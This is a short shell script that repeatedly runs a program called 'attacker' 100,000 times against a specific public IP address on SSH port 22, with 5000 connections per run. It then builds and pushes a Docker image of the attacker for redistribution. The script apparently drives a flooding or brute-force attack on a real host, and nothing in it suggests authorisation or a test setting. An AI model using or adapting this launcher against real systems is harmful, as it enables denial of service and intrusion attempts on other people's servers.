IP=13.90.20.250
total_runs=100000

for i in $(seq 1 $total_runs)
do
    ./attacker -i 13.90.20.250 -p 22 -n 5000 --verbose
done

#  docker run --env IP=13.90.20.250 attacker

docker build -f dockerfile -t hungvu034/attacker .
docker push hungvu034/attacker